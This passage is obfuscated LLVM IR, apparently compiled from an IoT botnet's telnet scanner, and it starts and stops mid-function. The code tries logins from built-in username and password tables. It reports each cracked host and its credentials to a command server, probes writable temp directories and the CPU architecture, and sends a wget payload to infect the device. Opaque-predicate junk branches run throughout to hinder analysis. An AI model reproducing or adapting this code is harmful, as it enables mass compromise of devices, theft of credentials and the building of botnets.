  %846 = load i32, i32* %6, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %847
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %848, i32 0, i32 0
  %850 = load i32, i32* %849, align 16
  %851 = load i32, i32* %3, align 4
  %852 = load i32, i32* %6, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 9
  %856 = load i8*, i8** %855, align 8
  %857 = call i32 @read_until_response(i32 %850, i32 %851, i8* %856, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %858 = icmp ne i32 %857, 0
  br i1 %858, label %859, label %946

; <label>:859:                                    ; preds = %845
  %860 = call i64 @time(i64* null) #5
  %861 = trunc i64 %860 to i32
  %862 = load i32, i32* %6, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 7
  store i32 %861, i32* %865, align 16
  %866 = load i32, i32* %6, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 9
  %870 = load i8*, i8** %869, align 8
  %871 = call i32 @contains_fail(i8* %870)
  %872 = icmp ne i32 %871, 0
  br i1 %872, label %873, label %877

; <label>:873:                                    ; preds = %859
  %874 = load i32, i32* %6, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %875
  call void @advance_telstate(%struct.telstate_t* %876, i32 0)
  br label %945

; <label>:877:                                    ; preds = %859
  %878 = load i32, i32* %6, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 9
  %882 = load i8*, i8** %881, align 8
  %883 = call i32 @contains_success(i8* %882)
  %884 = icmp ne i32 %883, 0
  br i1 %884, label %885, label %924

; <label>:885:                                    ; preds = %877
  %886 = load i32, i32* %6, align 4
  %887 = sext i32 %886 to i64
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %887
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %888, i32 0, i32 3
  %890 = load i8, i8* %889, align 1
  %891 = zext i8 %890 to i32
  %892 = icmp eq i32 %891, 2
  br i1 %892, label %893, label %897

; <label>:893:                                    ; preds = %885
  %894 = load i32, i32* %6, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %895
  call void @advance_telstate(%struct.telstate_t* %896, i32 7)
  br label %923

; <label>:897:                                    ; preds = %885
  %898 = load i32, i32* @mainCommSock, align 4
  %899 = load i32, i32* %6, align 4
  %900 = sext i32 %899 to i64
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %900
  %902 = call i8* @get_telstate_host(%struct.telstate_t* %901)
  %903 = load i32, i32* %6, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 4
  %907 = load i8, i8* %906, align 2
  %908 = zext i8 %907 to i64
  %909 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %908
  %910 = load i8*, i8** %909, align 8
  %911 = load i32, i32* %6, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 5
  %915 = load i8, i8* %914, align 1
  %916 = zext i8 %915 to i64
  %917 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %916
  %918 = load i8*, i8** %917, align 8
  %919 = call i32 (i32, i8*, ...) @sockprintf(i32 %898, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.277, i32 0, i32 0), i8* %902, i8* %910, i8* %918)
  %920 = load i32, i32* %6, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %921
  call void @advance_telstate(%struct.telstate_t* %922, i32 7)
  br label %923

; <label>:923:                                    ; preds = %897, %893
  br label %928

; <label>:924:                                    ; preds = %877
  %925 = load i32, i32* %6, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %926
  call void @reset_telstate(%struct.telstate_t* %927)
  br label %928

; <label>:928:                                    ; preds = %924, %923
  %929 = load i32, i32* @x.71
  %930 = load i32, i32* @y.72
  %931 = sub i32 %929, 1
  %932 = mul i32 %929, %931
  %933 = urem i32 %932, 2
  %934 = icmp eq i32 %933, 0
  %935 = icmp slt i32 %930, 10
  %936 = or i1 %934, %935
  br i1 %936, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %928
  %937 = load i32, i32* @x.71
  %938 = load i32, i32* @y.72
  %939 = sub i32 %937, 1
  %940 = mul i32 %937, %939
  %941 = urem i32 %940, 2
  %942 = icmp eq i32 %941, 0
  %943 = icmp slt i32 %938, 10
  %944 = or i1 %942, %943
  br i1 %944, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %945

; <label>:945:                                    ; preds = %originalBBpart2114, %873
  br label %1914

; <label>:946:                                    ; preds = %845
  %947 = load i32, i32* @x.71
  %948 = load i32, i32* @y.72
  %949 = sub i32 %947, 1
  %950 = mul i32 %947, %949
  %951 = urem i32 %950, 2
  %952 = icmp eq i32 %951, 0
  %953 = icmp slt i32 %948, 10
  %954 = or i1 %952, %953
  br i1 %954, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %946
  %955 = load i32, i32* %6, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %956
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %957, i32 0, i32 7
  %959 = load i32, i32* %958, align 16
  %960 = add i32 %959, 7
  %961 = zext i32 %960 to i64
  %962 = call i64 @time(i64* null) #5
  %963 = icmp slt i64 %961, %962
  %964 = load i32, i32* @x.71
  %965 = load i32, i32* @y.72
  %966 = sub i32 %964, 1
  %967 = mul i32 %964, %966
  %968 = urem i32 %967, 2
  %969 = icmp eq i32 %968, 0
  %970 = icmp slt i32 %965, 10
  %971 = or i1 %969, %970
  br i1 %971, label %originalBBpart2129, label %originalBB116alteredBB

originalBBpart2129:                               ; preds = %originalBB116
  br i1 %963, label %972, label %976

; <label>:972:                                    ; preds = %originalBBpart2129
  %973 = load i32, i32* %6, align 4
  %974 = sext i32 %973 to i64
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %974
  call void @reset_telstate(%struct.telstate_t* %975)
  br label %976

; <label>:976:                                    ; preds = %972, %originalBBpart2129
  br label %1913

; <label>:977:                                    ; preds = %originalBBpart218
  %978 = load i32, i32* %6, align 4
  %979 = sext i32 %978 to i64
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %979
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %980, i32 0, i32 0
  %982 = load i32, i32* %981, align 16
  %983 = call i32 (i32, i8*, ...) @sockprintf(i32 %982, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.278, i32 0, i32 0))
  %984 = icmp slt i32 %983, 0
  br i1 %984, label %985, label %989

; <label>:985:                                    ; preds = %977
  %986 = load i32, i32* %6, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %987
  call void @reset_telstate(%struct.telstate_t* %988)
  br label %1914

; <label>:989:                                    ; preds = %977
  %990 = load i32, i32* %6, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %991
  call void @advance_telstate(%struct.telstate_t* %992, i32 8)
  br label %1913

; <label>:993:                                    ; preds = %originalBBpart218
  %994 = load i32, i32* @x.71
  %995 = load i32, i32* @y.72
  %996 = sub i32 %994, 1
  %997 = mul i32 %994, %996
  %998 = urem i32 %997, 2
  %999 = icmp eq i32 %998, 0
  %1000 = icmp slt i32 %995, 10
  %1001 = or i1 %999, %1000
  br i1 %1001, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %993
  store i32 0, i32* %23, align 4
  store i32 0, i32* %23, align 4
  %1002 = load i32, i32* @x.71
  %1003 = load i32, i32* @y.72
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBBpart2133, label %originalBB131alteredBB

originalBBpart2133:                               ; preds = %originalBB131
  br label %1010

; <label>:1010:                                   ; preds = %1066, %originalBBpart2133
  %1011 = load i32, i32* @x.71
  %1012 = load i32, i32* @y.72
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
  %1018 = or i1 %1016, %1017
  br i1 %1018, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %1010
  %1019 = load i32, i32* %23, align 4
  %1020 = icmp slt i32 %1019, 5
  %1021 = load i32, i32* @x.71
  %1022 = load i32, i32* @y.72
  %1023 = sub i32 %1021, 1
  %1024 = mul i32 %1021, %1023
  %1025 = urem i32 %1024, 2
  %1026 = icmp eq i32 %1025, 0
  %1027 = icmp slt i32 %1022, 10
  %1028 = or i1 %1026, %1027
  br i1 %1028, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br i1 %1020, label %1029, label %1069

; <label>:1029:                                   ; preds = %originalBBpart2137
  %1030 = load i32, i32* %6, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 0
  %1034 = load i32, i32* %1033, align 16
  %1035 = load i32, i32* %23, align 4
  %1036 = sext i32 %1035 to i64
  %1037 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 %1036
  %1038 = load i8*, i8** %1037, align 8
  %1039 = load i32, i32* %23, align 4
  %1040 = sext i32 %1039 to i64
  %1041 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 %1040
  %1042 = load i8*, i8** %1041, align 8
  %1043 = call i32 (i32, i8*, ...) @sockprintf(i32 %1034, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i32 0, i32 0), i8* %1038, i8* %1042)
  %1044 = icmp slt i32 %1043, 0
  br i1 %1044, label %1045, label %1065

; <label>:1045:                                   ; preds = %1029
  %1046 = load i32, i32* @x.71
  %1047 = load i32, i32* @y.72
  %1048 = sub i32 %1046, 1
  %1049 = mul i32 %1046, %1048
  %1050 = urem i32 %1049, 2
  %1051 = icmp eq i32 %1050, 0
  %1052 = icmp slt i32 %1047, 10
  %1053 = or i1 %1051, %1052
  br i1 %1053, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %1045
  %1054 = load i32, i32* %6, align 4
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1055
  call void @reset_telstate(%struct.telstate_t* %1056)
  %1057 = load i32, i32* @x.71
  %1058 = load i32, i32* @y.72
  %1059 = sub i32 %1057, 1
  %1060 = mul i32 %1057, %1059
  %1061 = urem i32 %1060, 2
  %1062 = icmp eq i32 %1061, 0
  %1063 = icmp slt i32 %1058, 10
  %1064 = or i1 %1062, %1063
  br i1 %1064, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br label %1066

; <label>:1065:                                   ; preds = %1029
  br label %1066

; <label>:1066:                                   ; preds = %1065, %originalBBpart2141
  %1067 = load i32, i32* %23, align 4
  %1068 = add nsw i32 %1067, 1
  store i32 %1068, i32* %23, align 4
  br label %1010

; <label>:1069:                                   ; preds = %originalBBpart2137
  %1070 = load i32, i32* %6, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1071
  call void @advance_telstate(%struct.telstate_t* %1072, i32 9)
  br label %1913

; <label>:1073:                                   ; preds = %originalBBpart218
  %1074 = load i32, i32* %6, align 4
  %1075 = sext i32 %1074 to i64
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1075
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1076, i32 0, i32 0
  %1078 = load i32, i32* %1077, align 16
  %1079 = call i32 (i32, i8*, ...) @sockprintf(i32 %1078, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.280, i32 0, i32 0))
  %1080 = icmp slt i32 %1079, 0
  br i1 %1080, label %1081, label %1085

; <label>:1081:                                   ; preds = %1073
  %1082 = load i32, i32* %6, align 4
  %1083 = sext i32 %1082 to i64
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1083
  call void @reset_telstate(%struct.telstate_t* %1084)
  br label %1914

; <label>:1085:                                   ; preds = %1073
  %1086 = load i32, i32* %6, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1087
  call void @advance_telstate(%struct.telstate_t* %1088, i32 10)
  br label %1913

; <label>:1089:                                   ; preds = %originalBBpart218
  %1090 = load i32, i32* @x.71
  %1091 = load i32, i32* @y.72
  %1092 = sub i32 %1090, 1
  %1093 = mul i32 %1090, %1092
  %1094 = urem i32 %1093, 2
  %1095 = icmp eq i32 %1094, 0
  %1096 = icmp slt i32 %1091, 10
  %1097 = or i1 %1095, %1096
  br i1 %1097, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %1089
  %1098 = load i32, i32* %6, align 4
  %1099 = sext i32 %1098 to i64
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1099
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1100, i32 0, i32 0
  %1102 = load i32, i32* %1101, align 16
  %1103 = load i32, i32* %3, align 4
  %1104 = load i32, i32* %6, align 4
  %1105 = sext i32 %1104 to i64
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1105
  %1107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1106, i32 0, i32 9
  %1108 = load i8*, i8** %1107, align 8
  %1109 = call i32 @read_until_response(i32 %1102, i32 %1103, i8* %1108, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @archs, i32 0, i32 0))
  %1110 = icmp ne i32 %1109, 0
  %1111 = load i32, i32* @x.71
  %1112 = load i32, i32* @y.72
  %1113 = sub i32 %1111, 1
  %1114 = mul i32 %1111, %1113
  %1115 = urem i32 %1114, 2
  %1116 = icmp eq i32 %1115, 0
  %1117 = icmp slt i32 %1112, 10
  %1118 = or i1 %1116, %1117
  br i1 %1118, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  br i1 %1110, label %1119, label %1154

; <label>:1119:                                   ; preds = %originalBBpart2145
  %1120 = load i32, i32* @x.71
  %1121 = load i32, i32* @y.72
  %1122 = sub i32 %1120, 1
  %1123 = mul i32 %1120, %1122
  %1124 = urem i32 %1123, 2
  %1125 = icmp eq i32 %1124, 0
  %1126 = icmp slt i32 %1121, 10
  %1127 = or i1 %1125, %1126
  br i1 %1127, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %1119
  %1128 = load i32, i32* %6, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1129
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1130, i32 0, i32 9
  %1132 = load i8*, i8** %1131, align 8
  %1133 = load i8*, i8** %26, align 8
  %1134 = bitcast i8* %1133 to i8**
  %1135 = call i32 @contains_string(i8* %1132, i8** %1134)
  %1136 = icmp ne i32 %1135, 0
  %1137 = load i32, i32* @x.71
  %1138 = load i32, i32* @y.72
  %1139 = sub i32 %1137, 1
  %1140 = mul i32 %1137, %1139
  %1141 = urem i32 %1140, 2
  %1142 = icmp eq i32 %1141, 0
  %1143 = icmp slt i32 %1138, 10
  %1144 = or i1 %1142, %1143
  br i1 %1144, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br i1 %1136, label %1145, label %1149

; <label>:1145:                                   ; preds = %originalBBpart2149
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.281, i32 0, i32 0), i8** %25, align 8
  %1146 = load i32, i32* %6, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1147
  call void @advance_telstate(%struct.telstate_t* %1148, i32 11)
  br label %1153

; <label>:1149:                                   ; preds = %originalBBpart2149
  %1150 = load i32, i32* %6, align 4
  %1151 = sext i32 %1150 to i64
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1151
  call void @advance_telstate(%struct.telstate_t* %1152, i32 0)
  br label %1153

; <label>:1153:                                   ; preds = %1149, %1145
  br label %1154

; <label>:1154:                                   ; preds = %1153, %originalBBpart2145
  br label %1913

; <label>:1155:                                   ; preds = %originalBBpart218
  %1156 = load i32, i32* %6, align 4
  %1157 = sext i32 %1156 to i64
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 0
  %1160 = load i32, i32* %1159, align 16
  %1161 = call i32 (i32, i8*, ...) @sockprintf(i32 %1160, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.282, i32 0, i32 0))
  %1162 = icmp slt i32 %1161, 0
  br i1 %1162, label %1163, label %1167

; <label>:1163:                                   ; preds = %1155
  %1164 = load i32, i32* %6, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1165
  call void @reset_telstate(%struct.telstate_t* %1166)
  br label %1914

; <label>:1167:                                   ; preds = %1155
  %1168 = load i32, i32* @x.71
  %1169 = load i32, i32* @y.72
  %1170 = sub i32 %1168, 1
  %1171 = mul i32 %1168, %1170
  %1172 = urem i32 %1171, 2
  %1173 = icmp eq i32 %1172, 0
  %1174 = icmp slt i32 %1169, 10
  %1175 = or i1 %1173, %1174
  br i1 %1175, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %1167
  %1176 = load i32, i32* %6, align 4
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1177
  call void @advance_telstate(%struct.telstate_t* %1178, i32 12)
  %1179 = load i32, i32* @x.71
  %1180 = load i32, i32* @y.72
  %1181 = sub i32 %1179, 1
  %1182 = mul i32 %1179, %1181
  %1183 = urem i32 %1182, 2
  %1184 = icmp eq i32 %1183, 0
  %1185 = icmp slt i32 %1180, 10
  %1186 = or i1 %1184, %1185
  br i1 %1186, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %1913

; <label>:1187:                                   ; preds = %originalBBpart218
  %1188 = load i32, i32* %6, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 0
  %1192 = load i32, i32* %1191, align 16
  %1193 = load i32, i32* %3, align 4
  %1194 = load i32, i32* %6, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 9
  %1198 = load i8*, i8** %1197, align 8
  %1199 = call i32 @read_until_response(i32 %1192, i32 %1193, i8* %1198, i32 1024, i8** getelementptr inbounds ([3 x i8*], [3 x i8*]* @checkmethod, i32 0, i32 0))
  %1200 = icmp ne i32 %1199, 0
  br i1 %1200, label %1201, label %1264

; <label>:1201:                                   ; preds = %1187
  %1202 = load i32, i32* %6, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 9
  %1206 = load i8*, i8** %1205, align 8
  %1207 = load i8*, i8** %27, align 8
  %1208 = bitcast i8* %1207 to i8**
  %1209 = call i32 @contains_string(i8* %1206, i8** %1208)
  %1210 = icmp ne i32 %1209, 0
  br i1 %1210, label %1211, label %1215

; <label>:1211:                                   ; preds = %1201
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8** %24, align 8
  %1212 = load i32, i32* %6, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1213
  call void @advance_telstate(%struct.telstate_t* %1214, i32 13)
  br label %1263

; <label>:1215:                                   ; preds = %1201
  %1216 = load i32, i32* %6, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 9
  %1220 = load i8*, i8** %1219, align 8
  %1221 = load i8*, i8** %28, align 8
  %1222 = bitcast i8* %1221 to i8**
  %1223 = call i32 @contains_string(i8* %1220, i8** %1222)
  %1224 = icmp ne i32 %1223, 0
  br i1 %1224, label %1225, label %1229

; <label>:1225:                                   ; preds = %1215
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i32 0, i32 0), i8** %24, align 8
  %1226 = load i32, i32* %6, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1227
  call void @advance_telstate(%struct.telstate_t* %1228, i32 14)
  br label %1262

; <label>:1229:                                   ; preds = %1215
  %1230 = load i32, i32* %6, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1232, i32 0, i32 9
  %1234 = load i8*, i8** %1233, align 8
  %1235 = call i32 @contains_string(i8* %1234, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @echo, i32 0, i32 0))
  %1236 = icmp ne i32 %1235, 0
  br i1 %1236, label %1237, label %1241

; <label>:1237:                                   ; preds = %1229
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.283, i32 0, i32 0), i8** %24, align 8
  %1238 = load i32, i32* %6, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1239
  call void @advance_telstate(%struct.telstate_t* %1240, i32 15)
  br label %1245

; <label>:1241:                                   ; preds = %1229
  %1242 = load i32, i32* %6, align 4
  %1243 = sext i32 %1242 to i64
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1243
  call void @advance_telstate(%struct.telstate_t* %1244, i32 0)
  br label %1245

; <label>:1245:                                   ; preds = %1241, %1237
  %1246 = load i32, i32* @x.71
  %1247 = load i32, i32* @y.72
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %1245
  %1254 = load i32, i32* @x.71
  %1255 = load i32, i32* @y.72
  %1256 = sub i32 %1254, 1
  %1257 = mul i32 %1254, %1256
  %1258 = urem i32 %1257, 2
  %1259 = icmp eq i32 %1258, 0
  %1260 = icmp slt i32 %1255, 10
  %1261 = or i1 %1259, %1260
  br i1 %1261, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %1262

; <label>:1262:                                   ; preds = %originalBBpart2157, %1225
  br label %1263

; <label>:1263:                                   ; preds = %1262, %1211
  br label %1264

; <label>:1264:                                   ; preds = %1263, %1187
  br label %1913

; <label>:1265:                                   ; preds = %originalBBpart218
  %1266 = load i32, i32* @x.71
  %1267 = load i32, i32* @y.72
  %1268 = sub i32 %1266, 1
  %1269 = mul i32 %1266, %1268
  %1270 = urem i32 %1269, 2
  %1271 = icmp eq i32 %1270, 0
  %1272 = icmp slt i32 %1267, 10
  %1273 = or i1 %1271, %1272
  br i1 %1273, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %1265
  %1274 = load i32, i32* @mainCommSock, align 4
  %1275 = load i32, i32* %6, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 1
  %1279 = bitcast i32* %1278 to %struct.in_addr*
  %1280 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1279, i32 0, i32 0
  %1281 = load i32, i32* %1280, align 4
  %1282 = call i8* @inet_ntoa(i32 %1281) #5
  %1283 = load i32, i32* %6, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 4
  %1287 = load i8, i8* %1286, align 2
  %1288 = zext i8 %1287 to i64
  %1289 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1288
  %1290 = load i8*, i8** %1289, align 8
  %1291 = load i32, i32* %6, align 4
  %1292 = sext i32 %1291 to i64
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1292
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1293, i32 0, i32 5
  %1295 = load i8, i8* %1294, align 1
  %1296 = zext i8 %1295 to i64
  %1297 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1296
  %1298 = load i8*, i8** %1297, align 8
  %1299 = call i32 (i32, i8*, ...) @sockprintf(i32 %1274, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.284, i32 0, i32 0), i8* %1282, i8* %1290, i8* %1298)
  %1300 = load i32, i32* %6, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 0
  %1304 = load i32, i32* %1303, align 16
  %1305 = load i8*, i8** @wgetpayload, align 8
  %1306 = load i8*, i8** @wgetpayload, align 8
  %1307 = call i64 @strlen(i8* %1306) #9
  %1308 = call i64 @send(i32 %1304, i8* %1305, i64 %1307, i32 16384)
  %1309 = icmp slt i64 %1308, 0
  %1310 = load i32, i32* @x.71
  %1311 = load i32, i32* @y.72
  %1312 = sub i32 %1310, 1
  %1313 = mul i32 %1310, %1312
  %1314 = urem i32 %1313, 2
  %1315 = icmp eq i32 %1314, 0
  %1316 = icmp slt i32 %1311, 10
  %1317 = or i1 %1315, %1316
  br i1 %1317, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  br i1 %1309, label %1318, label %1322

; <label>:1318:                                   ; preds = %originalBBpart2161
  %1319 = load i32, i32* %6, align 4
  %1320 = sext i32 %1319 to i64
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1320
  call void @reset_telstate(%struct.telstate_t* %1321)
  br label %1914

; <label>:1322:                                   ; preds = %originalBBpart2161
  %1323 = load i32, i32* %6, align 4
  %1324 = sext i32 %1323 to i64
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1324
  call void @advance_telstate(%struct.telstate_t* %1325, i32 16)
  br label %1913

; <label>:1326:                                   ; preds = %originalBBpart218
  %1327 = load i32, i32* @mainCommSock, align 4
  %1328 = load i32, i32* %6, align 4
  %1329 = sext i32 %1328 to i64
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1329
